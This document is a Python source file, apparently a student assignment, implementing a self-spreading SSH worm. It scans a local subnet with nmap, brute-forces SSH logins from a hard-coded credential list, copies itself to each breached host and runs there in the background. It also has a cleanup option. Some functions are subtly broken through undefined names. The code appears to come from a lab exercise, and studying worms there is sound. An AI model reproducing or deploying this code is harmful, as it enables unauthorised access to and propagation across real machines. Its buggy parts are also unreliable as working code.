import paramiko
import sys
import socket
import nmap
import netifaces
import os
import os.path
from os.path import exists as file_exists

# The list of credentials to attempt
credList = [
    ('helo', 'world'),
    ('root', '#Gig#'),
    ('kali', 'kali'),
    ('osboxes', 'osboxes.org'),
    ('akshayak', 'Aksh2000')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
    # Check if the system as infected. One
    # approach is to check for a file called
    # infected.txt in directory /tmp (which
    # you created when you marked the system
    # as infected).
    return os.path.exists(INFECTED_MARKER_FILE)


#################################################################
# Marks the system as infected
#################################################################

def markInfected():
    # Mark the system as infected. One way to do
    # this is to create a file called infected.txt
    # in directory /tmp/

    f = open(INFECTED_MARKER_FILE, "w")
    f.close()


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
    # This function takes as a parameter
    # an instance of the SSH class which
    # was properly initialized and connected
    # to the victim system. The worm will
    # copy itself to remote system, change
    # its permissions to executable, and
    # execute itself. Please check out the
    # code we used for an in-class exercise.
    # The code which goes into this function
    # is very similar to that code.

    sftpClient = sshClient.open_sftp()
    sftpClient.put(sys.argv[0], "/tmp/worm.py")
    sshClient.exec_command(" nohup python3 /tmp/worm.py")
    sftpClient.close()
    sshClient.close()

#Extra Credit Part 1

def spreadAndClean(sshClient):
    sftpClient = sshClient.open_sftp()
    sftp.remove("/tmp/worm.py")          # Remove the required files
    sftp.remove(INFECTED_MARKER_FILE)
    sftpClient.close()
    sshClient.close()

    
#Extra Credit Part 2
    
def extendspread():

   hosts= nmap.PortScanner()
   liveHosts = []
   for host in hosts:
        if PortScanner[host].state() == "up":    
            liveHosts.append(host)
            
   if  "-m" in sys.argv or "--multi" in sys.argv:
        mPortScanner = nmap.PortScanner()
        mPortScanner.scan('10.20.22.0/25', arguments='-p 22 --open')
        multiData = mPortScanner.all_hosts()

        for multiHost in multiData:
            if mPortScanner[multiHost].state() == "up":
                liveHosts.append(multiHost)
    
        return liveHosts


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, passWord, sshClient):
    print("Attempting host %s with credentials u: %s, p: %s" % (host, userName, passWord))
    try:
        sshClient.connect(host, username=userName, password=passWord)
        return 0
    except paramiko.SSHException as error:
        print(error)
        return 1
    except socket.error as error:
        print(error)
        return 3


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################

def attackSystem(host):
    # The credential list
    global credList

    # Create an instance of the SSH client
    sshClient = paramiko.SSHClient()

    # Set some parameters to make things easier.
    sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:

        if tryCredentials(host, username, password, sshClient) == 0:
            return sshClient
    # Could not find working credentials
    else:
        return None


####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################


def getMyIP(interface):
    networkInterfaces = netifaces.interfaces()

    # The IP address
    ipAddr = None

    # Go through all the interfaces
    for netFace in networkInterfaces:

        # The IP address of the interface
        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        # Get the IP address
        if not addr == "127.0.0.1":
            # Save the IP addrss and break
            ipAddr = addr
            break

    return ipAddr


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan("10.20.22.0/25", arguments="-p 22 --open")
    return portScanner.all_hosts()


# If we are being run without a command line parameters,
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 


if len(sys.argv) < 2:
    if isInfectedSystem():
        sys.exit("Already infected.")
    else:
        markInfected()
        print("spreading")

currentSystemInterface = ""

for netFaces in netifaces.interfaces():
    if netFaces == 'lo':
        continue
    else:
        currentSystemInterface = netFaces
        break

# TODO: Get the IP of the current system
hostIP = getMyIP(currentSystemInterface)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
print("Removing current IP from host list...\n")
networkHosts.remove(hostIP)
# Remove the current value of hostIP from networkHosts

print("Found hosts: ", networkHosts)

# Go through the network hosts
for host in networkHosts:
    # Try to attack this host
    sshInfo = attackSystem(host)

    # Did the attack succeed?
    if sshInfo:
        if "-c" in sys.argv or "--clean" in sys.argv:
            print("Trying to clean")  # Clean the system
            spreadAndClean(sshInfo)
            print("Cleanup complete")

        else:
            print("Trying to spread")

            # Infect that system
            spreadAndExecute(sshInfo)
            print("Spreading complete")

